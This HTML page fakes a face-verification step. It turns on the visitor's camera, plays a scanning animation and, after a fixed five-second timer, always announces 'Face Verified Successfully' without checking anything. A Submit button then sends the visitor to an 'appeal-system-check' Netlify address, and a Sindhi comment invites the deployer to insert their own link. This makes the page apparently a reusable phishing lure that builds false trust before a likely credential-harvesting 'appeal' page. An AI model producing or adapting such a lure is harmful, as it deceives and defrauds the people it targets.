<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Face Verification</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:#0f172a;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    color:white;
}

.container{
    width:360px;
    background:#1e293b;
    padding:20px;
    border-radius:25px;
    text-align:center;
    box-shadow:0 0 25px rgba(0,0,0,0.5);
}

.title{
    font-size:26px;
    margin-bottom:15px;
    font-weight:bold;
}

.video-box{
    position:relative;
    border-radius:20px;
    overflow:hidden;
    border:3px solid #22c55e;
}

video{
    width:100%;
    height:260px;
    object-fit:cover;
    background:black;
}

.scan-frame{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    width:180px;
    height:220px;
    border:3px solid #22c55e;
    border-radius:20px;
    box-shadow:0 0 15px #22c55e;
}

.scan-line{
    position:absolute;
    width:100%;
    height:4px;
    background:#22c55e;
    top:0;
    animation:scan 2s linear infinite;
}

@keyframes scan{
    0%{ top:0; }
    100%{ top:100%; }
}

.status{
    margin-top:18px;
    font-size:18px;
}

.progress{
    width:100%;
    height:12px;
    background:#334155;
    border-radius:20px;
    overflow:hidden;
    margin-top:15px;
}

.bar{
    width:0%;
    height:100%;
    background:#22c55e;
    transition:width 5s linear;
}

button{
    width:100%;
    padding:14px;
    margin-top:18px;
    border:none;
    border-radius:15px;
    font-size:17px;
    cursor:pointer;
    font-weight:bold;
}

#scanBtn{
    background:#22c55e;
    color:white;
}

#submitBtn{
    display:none;
    background:#3b82f6;
    color:white;
}

</style>
</head>

<body>

<div class="container">

    <div class="title">
        Face Verification
    </div>

    <div class="video-box">

        <video id="video" autoplay playsinline></video>

        <div class="scan-frame">
            <div class="scan-line"></div>
        </div>

    </div>

    <div class="status" id="status">
        Ready To Scan
    </div>

    <div class="progress">
        <div class="bar" id="bar"></div>
    </div>

    <button id="scanBtn">
        Start Face Scan
    </button>

    <button id="submitBtn">
        Submit
    </button>

</div>

<script>

const video = document.getElementById("video");
const scanBtn = document.getElementById("scanBtn");
const submitBtn = document.getElementById("submitBtn");
const statusText = document.getElementById("status");
const bar = document.getElementById("bar");


// Camera Open
navigator.mediaDevices.getUserMedia({
    video:true
})
.then(stream=>{
    video.srcObject = stream;
})
.catch(()=>{
    alert("Camera Permission Denied");
});


// Start Scan
scanBtn.onclick = ()=>{

    statusText.innerHTML = "Scanning Face...";

    setTimeout(()=>{
        bar.style.width = "100%";
    },100);

    // 5 Seconds Scan
    setTimeout(()=>{

        statusText.innerHTML = "Face Verified Successfully";

        submitBtn.style.display = "block";

        scanBtn.style.display = "none";

    },5000);

};


// Submit Button Redirect
submitBtn.onclick = ()=>{

    // هتي پنهنجي لنڪ لڳايو
    window.location.href = "https://appeal-system-check.netlify.app/";

};

</script>

</body>
</html>
